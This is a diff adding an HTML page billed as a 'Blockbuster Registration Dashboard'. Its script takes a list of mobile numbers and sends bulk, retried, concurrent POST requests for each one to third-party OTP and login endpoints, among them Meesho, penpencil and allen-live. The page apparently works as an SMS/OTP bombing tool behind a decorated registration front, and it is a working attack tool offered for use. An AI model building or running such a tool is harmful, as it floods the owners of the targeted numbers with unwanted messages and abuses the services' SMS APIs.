@@ -1,0 +1,156 @@
+<!-- I F B 
+    c zentrix
+    9110912559
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Nitesh's server</title>
+<style>
+body { font-family: Arial, sans-serif; margin:0; padding:20px; background:#111; color:#eee; transition:background 0.3s,color 0.3s;}
+body.light { background:#f9f9f9; color:#333; }
+h1 { color:#ffeb3b; text-shadow:0 0 15px #ffeb3b; transition:text-shadow 0.3s; }
+button { padding:10px 20px; font-size:16px; cursor:pointer; margin-right:10px; border:none; border-radius:5px; background:linear-gradient(90deg,#4caf50,#00bcd4); color:#fff; text-shadow:0 0 5px #fff; transition:all 0.3s; }
+button:hover { box-shadow:0 0 25px #4caf50,0 0 50px #00bcd4; transform:scale(1.1); }
+textarea { width:100%; height:80px; font-size:16px; padding:8px; border-radius:5px; background:#222; color:#eee; transition:all 0.3s; }
+body.light textarea { background:#fff; color:#333; }
+#progressContainer { width:100%; background-color:#333; margin-top:10px; height:25px; border-radius:5px; overflow:hidden; box-shadow:0 0 10px #fff inset; }
+#progressBar { width:0%; height:100%; border-radius:5px; text-align:center; color:white; background:linear-gradient(90deg,#ff5722,#ffeb3b,#4caf50,#00bcd4); background-size:400% 100%; animation:rainbow 3s linear infinite; }
+@keyframes rainbow { 0%{background-position:0%} 100%{background-position:400%} }
+#status.success { color:#4caf50; font-weight:bold; }
+#status.error { color:#f44336; font-weight:bold; }
+#confetti,#fireworks { pointer-events:none; position:fixed; top:0; left:0; width:100%; height:100%; overflow:hidden; z-index:9999; }
+.confetti-piece,.firework-piece { position:absolute; width:10px; height:10px; border-radius:50%; opacity:0.7; animation:fall 3s linear forwards; }
+@keyframes fall { 0%{transform:translateY(0) rotate(0deg); opacity:1;} 100%{transform:translateY(100vh) rotate(720deg); opacity:0;} }
+.spark { position:absolute; width:5px; height:5px; border-radius:50%; pointer-events:none; background: linear-gradient(45deg,#ff0,#f0f); animation:sparkAnim 0.5s forwards; }
+@keyframes sparkAnim { 0%{opacity:1; transform:translate(0,0);} 100%{opacity:0; transform:translate(calc(50px*var(--dx)), calc(50px*var(--dy)));} }
+#particles { position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:0; overflow:hidden; }
+.particle { position:absolute; width:5px; height:5px; background-color:#fff; opacity:0.5; border-radius:50%; animation:floatParticle linear infinite; }
+@keyframes floatParticle { 0%{transform:translateY(0);} 100%{transform:translateY(-100vh);} }
+table { border-collapse:collapse; width:100%; margin-top:20px; }
+th,td { border:1px solid #555; padding:8px; text-align:left; }
+th { background:linear-gradient(90deg,#ff5722,#ff9800); color:#fff; text-shadow:0 0 5px #fff; }
+.successRow { animation:glowGreen 1s infinite alternate; }
+.failRow { animation:glowRed 1s infinite alternate; }
+@keyframes glowGreen { from{box-shadow:0 0 5px #4caf50;} to{box-shadow:0 0 25px #4caf50;} }
+@keyframes glowRed { from{box-shadow:0 0 5px #f44336;} to{box-shadow:0 0 25px #f44336;} }
+#liveTime { position:fixed; top:20px; right:20px; font-size:18px; background:rgba(0,0,0,0.5); padding:5px 10px; border-radius:5px; }
+body.light #liveTime { background:rgba(200,200,200,0.7); color:#111; }
+</style>
+</head>
+<body>
+<div id="particles"></div>
+<div id="confetti"></div>
+<div id="fireworks"></div>
+
+<h1>Blockbuster Registration Dashboard</h1>
+<h1 style="font-size: larger;color: red;">Nitesh's Webpage</h1>
+<div id="liveTime"></div>
+<button onclick="toggleTheme()"> ☀️ Day/🌙Night</button><br><br>
+
+<p>Enter mobile numbers (comma-separated):</p>
+<textarea id="mobileNumbers" placeholder="e.g.9876543210,7676878740"></textarea><br><br>
+<label>Batch size: <input type="number" id="batchSize" value="50" min="1" max="500"></label>
+<label>Retry attempts: <input type="number" id="retryCount" value="2" min="0" max="5000"></label>
+<button onclick="startRegistration()">Start Registration</button>
+
+<div id="status"></div>
+<div id="progressContainer"><div id="progressBar">0%</div></div>
+<p>✅ Success: <span id="successCount">0</span> | ❌ Fail: <span id="failCount">0</span></p>
+<div id="result"></div>
+
+<audio id="successSound" src="https://actions.google.com/sounds/v1/cartoon/clang.ogg"></audio>
+<audio id="failSound" src="https://actions.google.com/sounds/v1/cartoon/boo.ogg"></audio>
+
+<script>
+// ----- Configuration -----
+const API_ENDPOINTS = [
+  'https://www.meesho.com/api/v1/user/login/request-otp',
+  'https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0',
+  'https://api.allen-live.in/api/v1/auth/sendOtp ',
+  'https://edge-graph.adobe.io/.../graphql',
+  
+
+];
+
+let tableRows=[], successCount=0, failCount=0, paused=false;
+
+// ----- Utilities -----
+function toggleTheme(){document.body.classList.toggle('light');}
+function delay(ms){return new Promise(r=>setTimeout(r,ms));}
+function generateUUID(){return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,c=> (Math.random()*16|0).toString(16));}
+function updateProgress(percent){const bar=document.getElementById('progressBar'); bar.style.width=percent+'%'; bar.textContent=Math.floor(percent)+'%';}
+function updateCounters(){document.getElementById('successCount').textContent=successCount; document.getElementById('failCount').textContent=failCount;}
+function updateResultTable(){ 
+  const resultDiv=document.getElementById('result');
+  resultDiv.innerHTML=`<h3>Results:</h3><table><tr><th>Mobile Number</th><th>Status</th></tr>${tableRows.map(r=>`<tr class="${r.status.startsWith('✅')?'successRow':'failRow'}"><td>${r.number}</td><td>${r.status}</td></tr>`).join('')}</table>`;
+}
+
+// ----- Live Time -----
+function updateTime(){document.getElementById('liveTime').textContent=new Date().toLocaleTimeString();}
+setInterval(updateTime,1000);
+updateTime();
+
+// ----- Particles -----
+for(let i=0;i<100;i++){const p=document.createElement('div'); p.className='particle'; p.style.left=Math.random()*100+'%'; p.style.top=Math.random()*100+'%'; p.style.width=2+Math.random()*3+'px'; p.style.height=2+Math.random()*3+'px'; p.style.animationDuration=(5+Math.random()*5)+'s'; document.getElementById('particles').appendChild(p);}
+
+// ----- Spark & MiniExplosions -----
+document.addEventListener('mousemove', e=>{ createSpark(e.pageX,e.pageY); });
+function createSpark(x=window.innerWidth/2,y=window.innerHeight/2){const s=document.createElement('div'); s.className='spark'; s.style.left=x+'px'; s.style.top=y+'px'; s.style.setProperty('--dx', Math.random()*2-1); s.style.setProperty('--dy', Math.random()*2-1); document.body.appendChild(s); setTimeout(()=>s.remove(),500);}
+function launchConfetti(count){const container=document.getElementById('confetti'); for(let i=0;i<count;i++){const div=document.createElement('div'); div.className='confetti-piece'; div.style.backgroundColor=`hsl(${Math.random()*360},100%,50%)`; div.style.left=Math.random()*100+'%'; div.style.animationDuration=(2+Math.random()*3)+'s'; div.style.width=5+Math.random()*5+'px'; div.style.height=5+Math.random()*5+'px'; container.appendChild(div); setTimeout(()=>div.remove(),4000);}}
+function launchFireworks(count){const container=document.getElementById('fireworks'); for(let i=0;i<count;i++){const div=document.createElement('div'); div.className='firework-piece'; div.style.backgroundColor=`hsl(${Math.random()*360},100%,50%)`; div.style.left=Math.random()*100+'%'; div.style.animationDuration=(1+Math.random()*2)+'s'; div.style.width=3+Math.random()*5+'px'; div.style.height=3+Math.random()*5+'px'; container.appendChild(div); setTimeout(()=>div.remove(),2000);}}
+function createMiniExplosion(){launchFireworks(5); launchConfetti(10);}
+
+// ----- Multiple API Function -----
+async function sendWithMultipleAPIs(number, maxRetries=2){
+  let attempt=0, success=false;
+  while(attempt<=maxRetries && !success ){
+    for(const endpoint of API_ENDPOINTS){
+      try{
+        const res=await fetch(endpoint,{method:'POST', headers:{'Content-Type':'application/json','randomid':generateUUID()}, body:JSON.stringify({mobile:number,countryCode:'+91',subOrgId:'SUB-PWLI000'})});
+        const json=await res.json();
+        if(res.ok && json.success){
+          tableRows.push({number,status:`✅ Success via ${endpoint}`});
+          successCount++; updateCounters();
+          document.getElementById('successSound').play(); createSpark(); createMiniExplosion();
+          success=true; break;
+        } else {
+          tableRows.push({number,status:`❌ Failed at ${endpoint}: ${json.message||'Unknown error'}`});
+          failCount++; updateCounters(); document.getElementById('failSound').play();
+        }
+      }catch(e){
+        tableRows.push({number,status:`❌ Error at ${endpoint}: ${e.message}`});
+        failCount++; updateCounters(); document.getElementById('failSound').play();
+      }
+    }
+    attempt++;
+  }
+  if(!success){tableRows.push({number,status:`❌ All APIs failed after ${maxRetries} attempts`}); updateResultTable();}
+  else{updateResultTable();}
+}
+
+// ----- Registration Start -----
+async function startRegistration(){
+  const input=document.getElementById('mobileNumbers').value.trim();
+  if(!input){document.getElementById('status').textContent='❌ Enter numbers'; return;}
+  const numbers=input.split(',').map(n=>n.trim()).filter(n=>n!=='');
+  const batchSize=parseInt(document.getElementById('batchSize').value)||50;
+  const retryCount=parseInt(document.getElementById('retryCount').value)||2;
+
+  tableRows=[]; successCount=0; failCount=0; updateCounters(); updateProgress(0);
+  document.getElementById('status').textContent='📤 Starting registration...';
+
+  for(let i=0;i<numbers.length;i+=batchSize){
+    const batch=numbers.slice(i,i+batchSize);
+    await Promise.all(batch.map(num=>sendWithMultipleAPIs(num,retryCount)));
+    updateProgress(((i+batch.length)/numbers.length)*100);
+    document.getElementById('status').textContent=`📤 Processed ${Math.min(i+batch.length,numbers.length)} / ${numbers.length}`;
+  }
+
+  document.getElementById('status').textContent=`✅ Finished ${numbers.length} requests!`;
+  launchConfetti(100); launchFireworks(500);
+}
+</script>
+</body>
+</html>
